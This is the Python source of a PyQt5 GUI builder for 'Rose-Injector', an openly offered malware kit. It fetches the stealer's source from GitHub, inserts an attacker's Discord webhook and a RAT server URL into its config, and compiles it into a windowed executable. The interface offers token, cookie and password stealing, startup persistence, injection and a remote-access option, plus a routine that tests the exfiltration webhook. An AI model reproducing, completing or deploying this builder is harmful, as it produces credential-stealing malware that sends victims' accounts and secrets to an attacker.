""" 

NEED TO MAKE THE PING METHOD WORKING ON RUNNABLE 
@xpierroz 20/03
"""

# Main GUI for Rose-Injector made by @suegdu and @xpierroz
# Follow the comments on each, for guiding.

__version__ = 1.0
__repo__ = "https://github.com/DamagingRose/Rose-Injector/"
__icon__ = "https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/tools/rose.png"

try:
    import webbrowser
    import time
    import requests
    import platform
    from bs4 import BeautifulSoup
    from pathlib import Path
    from dhooks import Webhook, Embed
    from PyQt5 import QtCore, QtGui, QtWidgets
    from PyQt5.QtCore import QRunnable, Qt, QThreadPool
    import os
except:
    import subprocess
    subprocess.run("python -m pip install requests && python -m pip install beautifulsoup4 && python -m pip install PyQt5 && python -m pip install pypiwin32")


class Runnable(QRunnable):
    def __init__(self, n, webhook_url):
        super().__init__()
        self.n = n
        self.webhook_url = webhook_url
    def run(self):
        hook = Webhook(self.webhook_url)
        embed = Embed(
            description='Webhook is Working',
            color=11795068,
            timestamp="now"
        )
        embed.set_author(name="Success", icon_url=__icon__)
        embed.set_footer(text="Rose Builder | By pierro, suegdu, Gumbobrot, svn", icon_url=__icon__)
        hook.send(embed=embed)
            
class Runnable_wf(QRunnable):
    def __init__(
        self, n,
        dir_name,
        webhook_url,
        rat_checked,
        rat_link
    ):        
        super().__init__()
        self.n = n
        self.dir_name = dir_name
        self.webhook_url = webhook_url
        self.rat_checked = rat_checked
        self.rat_link = rat_link
        
    def create_dir(self):
        self.path = f"{Path(__file__).resolve().parent}\\{self.dir_name}"
        os.mkdir(self.path)
        
    def make_req(self):
        page = requests.get('https://github.com/DamagingRose/Rose-Injector/tree/main/source').text
        soup = BeautifulSoup(page, 'html.parser')
        allFiles = [link.text for link in soup.find_all('a') if link['href'] == f"/DamagingRose/Rose-Injector/blob/main/source/{link.text}" ]
        for file in allFiles:
            text = requests.get(f"https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/source/{file}").text
            with open(f"{self.path}\\{file}","w",encoding="utf-8") as f:
                f.write(str(text))
                
    def edit_config(self):
        with open(f"{self.path}\\config.py","r",encoding="utf-8") as f:
            text = f.read()
            new = text.replace("HOOK", f"{self.webhook_url}").replace("discord_rat = False", f"discord_rat = {str(self.rat_checked)}").replace("DISCORD_RAT_SOCKET_LINK", f"{self.rat_link}")
            """text.replace("HOOK", f"{self.webhook_url}")
            text.replace("discord_rat = False", f"discord_rat = {str(self.rat_checked)}")
            text.replace("DISCORD_RAT_SOCKET_LINK", f"{self.rat_link}")
            """
        print(new)
        with open(f"{self.path}\\config.py", "w", encoding="utf-8") as f:
            f.write(new)
            
        dir_list = os.listdir(self.path)
        
        for file in dir_list:
            with open(f"{self.path}\\{file}", "r", encoding="utf-8") as f:
                text = f.read()
                new = text.replace("from configuration", f"from config")
                
            with open(f"{self.path}\\{file}", "w", encoding="utf-8") as f:
                f.write(new)
                
    def compile(self):
        os.system(f'pyinstaller --noconfirm --onefile --windowed  "{self.path}/main.py"')
        

    def run(self):
        try:
            print(str(self.rat_checked))
            self.create_dir()
            self.make_req()
            self.edit_config()
            self.compile()
        except Exception as e:
            print(e)


class Ui_MainWindow_vailB(object):
    # This is the final shape of builder's gui and it is not linked to any functions with builder's functionality. -suegdu 3/11/2023

    def setupUi(self, MainWindow_vailB):
        MainWindow_vailB.setObjectName("MainWindow_vailB")
        MainWindow_vailB.resize(741, 420)
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap("./rose.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off) # Will check for the icon within the current running directory. If not then it will be the default Windows executable icon. -suegdu
        MainWindow_vailB.setWindowIcon(icon)
        MainWindow_vailB.setStatusTip("")
        self.centralwidget = QtWidgets.QWidget(MainWindow_vailB)
        self.centralwidget.setObjectName("centralwidget")
        self.tabWidget = QtWidgets.QTabWidget(self.centralwidget)
        self.tabWidget.setGeometry(QtCore.QRect(10, 10, 721, 391))
        self.tabWidget.setObjectName("tabWidget")
        self.tab_builder = QtWidgets.QWidget()
        self.tab_builder.setObjectName("tab_builder")
        self.groupBox_6 = QtWidgets.QGroupBox(self.tab_builder)
        self.groupBox_6.setGeometry(QtCore.QRect(10, 10, 691, 331))
        self.groupBox_6.setObjectName("groupBox_6")
        self.LE_webhook_url = QtWidgets.QLineEdit(self.groupBox_6)
        self.LE_webhook_url.setGeometry(QtCore.QRect(230, 20, 181, 20))
        self.LE_webhook_url.setObjectName("LE_webhook_url")
        self.label_2 = QtWidgets.QLabel(self.groupBox_6)
        self.label_2.setGeometry(QtCore.QRect(150, 20, 82, 20))
        self.label_2.setObjectName("label_2")
        
        self.dir_name_input = QtWidgets.QLineEdit(self.groupBox_6)
        self.dir_name_input.setGeometry(QtCore.QRect(230, 42, 181, 20))
        self.dir_name_input.setObjectName("dir_name_input")
        
        self.dir_name = QtWidgets.QLabel(self.groupBox_6)
        self.dir_name.setGeometry(QtCore.QRect(150, 40, 100, 20))
        self.dir_name.setObjectName("dir_name")
        
        self.B_build = QtWidgets.QPushButton(self.groupBox_6)
        self.B_build.setGeometry(QtCore.QRect(20, 20, 111, 31))
        self.B_build.setObjectName("B_build")
        self.B_testhook = QtWidgets.QPushButton(self.groupBox_6)
        self.B_testhook.setGeometry(QtCore.QRect(20, 60, 111, 31))
        self.B_testhook.setObjectName("B_testhook")
        self.groupBox_7 = QtWidgets.QGroupBox(self.groupBox_6)
        self.groupBox_7.setGeometry(QtCore.QRect(20, 100, 281, 211))
        self.groupBox_7.setObjectName("groupBox_7")
        self.console_0 = QtWidgets.QTextBrowser(self.groupBox_7)
        self.console_0.setGeometry(QtCore.QRect(20, 20, 241, 171))
        self.console_0.setObjectName("console_0")
        self.groupBox_8 = QtWidgets.QGroupBox(self.groupBox_6)
        self.groupBox_8.setGeometry(QtCore.QRect(430, 10, 251, 301))
        self.groupBox_8.setObjectName("groupBox_8")
        self.CB_startup = QtWidgets.QCheckBox(self.groupBox_8)
        self.CB_startup.setGeometry(QtCore.QRect(20, 20, 70, 17))
        self.CB_startup.setObjectName("CB_startup")
        self.CB_injection = QtWidgets.QCheckBox(self.groupBox_8)
        self.CB_injection.setGeometry(QtCore.QRect(20, 40, 70, 17))
        self.CB_injection.setObjectName("CB_injection")
        self.CB_tokensteal = QtWidgets.QCheckBox(self.groupBox_8)
        self.CB_tokensteal.setGeometry(QtCore.QRect(20, 60, 101, 17))
        self.CB_tokensteal.setObjectName("CB_tokensteal")
        self.CB_cookiesteal = QtWidgets.QCheckBox(self.groupBox_8)
        self.CB_cookiesteal.setGeometry(QtCore.QRect(20, 80, 101, 17))
        self.CB_cookiesteal.setObjectName("CB_cookiesteal")
        self.CB_passsteal = QtWidgets.QCheckBox(self.groupBox_8)
        self.CB_passsteal.setGeometry(QtCore.QRect(20, 100, 161, 17))
        self.CB_passsteal.setObjectName("CB_passsteal")
        self.groupBox_10 = QtWidgets.QGroupBox(self.groupBox_8)
        self.groupBox_10.setGeometry(QtCore.QRect(10, 210, 231, 81))
        self.groupBox_10.setObjectName("groupBox_10")
        self.comboBox = QtWidgets.QComboBox(self.groupBox_10)
        self.comboBox.setGeometry(QtCore.QRect(10, 50, 211, 22))
        self.comboBox.setObjectName("comboBox")
        self.comboBox.addItem("")
        self.comboBox.addItem("")
        self.groupBox_ratsec = QtWidgets.QGroupBox(self.groupBox_8)
        self.groupBox_ratsec.setGeometry(QtCore.QRect(10, 140, 231, 71))
        self.groupBox_ratsec.setObjectName("groupBox_ratsec")
        self.CB_rat = QtWidgets.QCheckBox(self.groupBox_ratsec)
        self.CB_rat.setGeometry(QtCore.QRect(10, 20, 161, 17))
        self.radioButton = QtWidgets.QRadioButton(self.groupBox_10)
        self.radioButton.setGeometry(QtCore.QRect(10, 20, 82, 17))
        self.radioButton.setObjectName("radioButton")
        self.LE_ratsserver = QtWidgets.QLineEdit(self.groupBox_ratsec)
        self.LE_ratsserver.setGeometry(QtCore.QRect(72, 40, 151, 20))
        self.LE_ratsserver.setObjectName("LE_ratsserver")
        self.label = QtWidgets.QLabel(self.groupBox_ratsec)
        self.label.setGeometry(QtCore.QRect(10, 40, 71, 16))
        self.label.setObjectName("label")
        self.CB_rat.setObjectName("CB_rat")
        #self.comboBox.hide() 
        self.ping = QtWidgets.QCheckBox(self.groupBox_10)
        self.ping.setGeometry(QtCore.QRect(10, 20, 82, 17))
        self.ping.setObjectName("ping")
        self.progressBar = QtWidgets.QProgressBar(self.groupBox_6)
        self.progressBar.setGeometry(QtCore.QRect(230, 70, 181, 20))
        self.progressBar.setProperty("value", 0)
        self.progressBar.setTextVisible(False)
        self.progressBar.setObjectName("progressBar")
        self.B_clearconsole = QtWidgets.QPushButton(self.groupBox_6)
        self.B_clearconsole.setGeometry(QtCore.QRect(140, 60, 81, 31))
        self.B_clearconsole.setObjectName("B_clearconsole")
        self.B_ghubupdates = QtWidgets.QPushButton(self.tab_builder)
        self.B_ghubupdates.setGeometry(QtCore.QRect(590, 343, 111, 20))
        self.B_ghubupdates.setObjectName("B_ghubupdates")
        self.tabWidget.addTab(self.tab_builder, "")
        self.tab_credits = QtWidgets.QWidget()
        self.tab_credits.setObjectName("tab_credits")
        self.groupBox_4 = QtWidgets.QGroupBox(self.tab_credits)
        self.groupBox_4.setGeometry(QtCore.QRect(10, 10, 691, 271))
        self.groupBox_4.setObjectName("groupBox_4")
        self.groupBox_2 = QtWidgets.QGroupBox(self.groupBox_4)
        self.groupBox_2.setGeometry(QtCore.QRect(10, 20, 651, 81))
        self.groupBox_2.setObjectName("groupBox_2")
        self.B_github_gumb = QtWidgets.QPushButton(self.groupBox_2)
        self.B_github_gumb.setGeometry(QtCore.QRect(30, 30, 81, 23))
        self.B_github_gumb.setObjectName("B_github_gumb")
        self.groupBox = QtWidgets.QGroupBox(self.groupBox_4)
        self.groupBox.setGeometry(QtCore.QRect(10, 190, 651, 71))
        self.groupBox.setObjectName("groupBox")
        self.B_github_sue = QtWidgets.QPushButton(self.groupBox)
        self.B_github_sue.setGeometry(QtCore.QRect(30, 30, 81, 23))
        self.B_github_sue.setObjectName("B_github_sue")
        self.groupBox_3 = QtWidgets.QGroupBox(self.groupBox_4)
        self.groupBox_3.setGeometry(QtCore.QRect(10, 100, 331, 81))
        self.groupBox_3.setObjectName("groupBox_3")
        self.B_github_ice = QtWidgets.QPushButton(self.groupBox_3)
        self.B_github_ice.setGeometry(QtCore.QRect(30, 30, 81, 23))
        self.B_github_ice.setObjectName("B_github_ice")
        self.groupBox_9 = QtWidgets.QGroupBox(self.groupBox_4)
        self.groupBox_9.setGeometry(QtCore.QRect(350, 100, 311, 81))
        self.groupBox_9.setObjectName("groupBox_9")
        self.B_github_suvan = QtWidgets.QPushButton(self.groupBox_9)
        self.B_github_suvan.setGeometry(QtCore.QRect(30, 30, 81, 23))
        self.B_github_suvan.setObjectName("B_github_suvan")
        self.groupBox_5 = QtWidgets.QGroupBox(self.tab_credits)
        self.groupBox_5.setGeometry(QtCore.QRect(10, 290, 691, 51))
        self.groupBox_5.setObjectName("groupBox_5")
        self.label_versiondet = QtWidgets.QLabel(self.groupBox_5)
        self.label_versiondet.setGeometry(QtCore.QRect(20, 20, 131, 16))
        self.label_versiondet.setObjectName("label_versiondet")
        self.B_vail_repo = QtWidgets.QPushButton(self.groupBox_5)
        self.B_vail_repo.setGeometry(QtCore.QRect(580, 10, 91, 31))
        self.B_vail_repo.setObjectName("B_vail_repo")
        self.tabWidget.addTab(self.tab_credits, "")
        MainWindow_vailB.setCentralWidget(self.centralwidget)
        self.statusbar = QtWidgets.QStatusBar(MainWindow_vailB)
        self.statusbar.setObjectName("statusbar")
        MainWindow_vailB.setStatusBar(self.statusbar)
        self.menubar = QtWidgets.QMenuBar(MainWindow_vailB)
        self.menubar.setGeometry(QtCore.QRect(0, 0, 741, 21))
        self.menubar.setObjectName("menubar")
        MainWindow_vailB.setMenuBar(self.menubar)
        self.action = QtWidgets.QAction(MainWindow_vailB)
        self.action.setObjectName("action")
        self.actionCredits = QtWidgets.QAction(MainWindow_vailB)
        self.actionCredits.setObjectName("actionCredits")
        self.actionGithub = QtWidgets.QAction(MainWindow_vailB)
        self.actionGithub.setObjectName("actionGithub")
        self.actionCredits_2 = QtWidgets.QAction(MainWindow_vailB)
        self.actionCredits_2.setObjectName("actionCredits_2")
        self.retranslateUi(MainWindow_vailB)
        self.tabWidget.setCurrentIndex(0)
        self.comboBox.setDisabled(True)
        self.LE_ratsserver.setDisabled(True)
        self.ping.clicked.connect(lambda : self.comboBox.setEnabled(True) if self.ping.isChecked() else self.comboBox.setDisabled(True))
        self.CB_rat.clicked.connect(lambda : self.LE_ratsserver.setEnabled(True) if self.CB_rat.isChecked() else self.LE_ratsserver.setDisabled(True))
        self.B_github_sue.clicked.connect(self.sueghub)
        self.B_github_ice.clicked.connect(self.iceghub)
        self.B_testhook.clicked.connect(self.test_hook)
        self.B_github_gumb.clicked.connect(self.gumghub)
        self.B_ghubupdates.clicked.connect(self.github)
        self.B_github_suvan.clicked.connect(self.svnghub)
        self.B_clearconsole.clicked.connect(self.clearconsole)
        self.B_vail_repo.clicked.connect(self.github)
        self.B_build.clicked.connect(self.pb_build) # connect a function to the push button by doing this so (All push buttons are described as B_.. then the identifier.)
        QtCore.QMetaObject.connectSlotsByName(MainWindow_vailB)
    def retranslateUi(self, MainWindow_vailB):
        _translate = QtCore.QCoreApplication.translate
        MainWindow_vailB.setWindowTitle(_translate("MainWindow_vailB", f"Rose Builder {__version__}"))
        self.groupBox_6.setTitle(_translate("MainWindow_vailB", "Control Panel"))
        self.label_2.setText(_translate("MainWindow_vailB", "Webhook URL :"))
        self.dir_name.setText(_translate("MainWindow_vailB", "Build Name :"))
        self.B_build.setText(_translate("MainWindow_vailB", "Build"))
        self.B_testhook.setText(_translate("MainWindow_vailB", "Test Webhook"))
        self.groupBox_7.setTitle(_translate("MainWindow_vailB", "Console"))
        self.groupBox_8.setTitle(_translate("MainWindow_vailB", "Settings"))
        self.CB_startup.setText(_translate("MainWindow_vailB", "Startup"))
        self.CB_injection.setText(_translate("MainWindow_vailB", "Injection"))
        self.CB_tokensteal.setText(_translate("MainWindow_vailB", "Token Stealing"))
        self.CB_cookiesteal.setText(_translate("MainWindow_vailB", "Cookie Stealing"))
        self.CB_passsteal.setText(_translate("MainWindow_vailB", "Password Stealing"))
        self.groupBox_10.setTitle(_translate("MainWindow_vailB", "Ping Method"))
        self.comboBox.setItemText(0, _translate("MainWindow_vailB", "everyone"))
        self.comboBox.setItemText(1, _translate("MainWindow_vailB", "here"))
        self.ping.setText(_translate("MainWindow_vailB", "Ping"))
        self.groupBox_ratsec.setTitle(_translate("MainWindow_vailB", "Rat Section"))
        self.CB_rat.setText(_translate("MainWindow_vailB", "Rat"))
        self.label.setText(_translate("MainWindow_vailB", "Server URL :"))
        self.B_clearconsole.setText(_translate("MainWindow_vailB", "Clear Console"))
        self.B_ghubupdates.setText(_translate("MainWindow_vailB", "Github For Updates"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_builder), _translate("MainWindow_vailB", "Builder"))
        self.groupBox_4.setTitle(_translate("MainWindow_vailB", "Credits"))
        self.groupBox_2.setTitle(_translate("MainWindow_vailB", "Gumbobrot"))
        self.B_github_gumb.setText(_translate("MainWindow_vailB", "Github"))
        self.groupBox.setTitle(_translate("MainWindow_vailB", "suegdu"))
        self.B_github_sue.setText(_translate("MainWindow_vailB", "Github"))
        self.groupBox_3.setTitle(_translate("MainWindow_vailB", "xpierroz"))
        self.B_github_ice.setText(_translate("MainWindow_vailB", "Github"))
        self.B_github_suvan.setText(_translate("MainWindow_vailB", "Github"))
        self.groupBox_9.setTitle(_translate("MainWindow_vailB", "suvan"))
        self.groupBox_5.setTitle(_translate("MainWindow_vailB", "Rose"))
        self.label_versiondet.setText(_translate("MainWindow_vailB", f"Builder Version : {__version__}"))
        self.B_vail_repo.setText(_translate("MainWindow_vailB", "Rose Repo"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_credits), _translate("MainWindow_vailB", "Info"))
        self.action.setText(_translate("MainWindow_vailB", "Github"))
        self.actionCredits.setText(_translate("MainWindow_vailB", "Credits"))
        self.actionGithub.setText(_translate("MainWindow_vailB", "Github"))
        self.actionCredits_2.setText(_translate("MainWindow_vailB", "Credits"))
        self.console_write(f"Launched Rose {__version__} Successfully.\n{__repo__}")
    # List the linked functions below this class. -suegdu


    # Updates the console
    def console_write(self,message):
        self.console_0.insertPlainText(f"{str(message)}\n")
    
    @staticmethod
    def sueghub():
        webbrowser.open("https://github.com/suegdu")
    @staticmethod
    def iceghub():
        webbrowser.open("https://github.com/xpierroz")
    @staticmethod
    def gumghub():
        webbrowser.open("https://github.com/Gumbobrot")
    @staticmethod
    def svnghub():
        webbrowser.open("https://github.com/suvan1911")
    @staticmethod
    def github():
        webbrowser.open(__repo__)

    def prorsload(self):
        for i in range(99):
            time.sleep(00.001)
            self.progressBar.setProperty("value", i+1)
    def prorsunload(self):
        self.progressBar.setProperty("value",0)

    # The progressBar manager Use the following arguments for execution: mode = "start" will load it fully till you call the stopping argument: mode = "stop",
    # For calling it once to unload afterwards use the argument: mode = 0 (int).
    def prorsmng(self,mode):
        if mode=="start":
            self.prorsload()
        elif mode=="stop":
            self.prorsunload()
        elif mode==0:
            self.prorsload()
            self.prorsunload()
    def clearconsole(self):
        self.console_0.clear()

    def writesource(self):
        pool = QThreadPool.globalInstance()
        runnable = Runnable_wf(
            1,
            self.dir_name_input.text(),
            self.LE_webhook_url.text(),
            self.CB_rat.isChecked(),
            self.LE_ratsserver.text()
        )
        pool.start(runnable)


    def test_hook(self):
        vfi = "discord.com/api"
        if str(self.LE_webhook_url.text()) ==str():
            self.console_write("Error: No URL provided.")
            return
        if str(self.LE_webhook_url.text()).isspace():
            self.console_write("Error: No URL provided.")
            return
        if vfi not in str(self.LE_webhook_url.text()) :
                self.console_write("Error: Invalid webhook URL provided.")
                return
        pool = QThreadPool.globalInstance()
        runnable = Runnable(1, self.LE_webhook_url.text())
        pool.start(runnable)

    # The main function when the Build button gets pushed.
    def pb_build(self):
        if str(self.dir_name_input.text()) == str() or str(self.LE_webhook_url.text()).isspace():
            self.console_write("Error: No build name provided.")
            return
        
        if self.CB_rat.isChecked() is True:
            if self.LE_ratsserver.text() == str() or str(self.LE_ratsserver.text()).isspace():
                self.console_write("Error: No RAT URL provided.")
                return
        
        self.console_write("\nStarted building....")
        self.prorsmng("start")
        self.console_write("\nRequesting Source....")
        self.writesource() # <------ during the function procedure it passes its call
        # and skips directly to console_write("Writing Source....") due to its threadining, will do so to
        # all listed functions below which will cause a chaos. Must fix -suegdu

        self.console_write("Writing Source....") 
        # function something
        self.prorsmng("stop")


if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    MainWindow_vailB = QtWidgets.QMainWindow()
    ui = Ui_MainWindow_vailB()
    ui.setupUi(MainWindow_vailB)
    MainWindow_vailB.show()
    sys.exit(app.exec_())
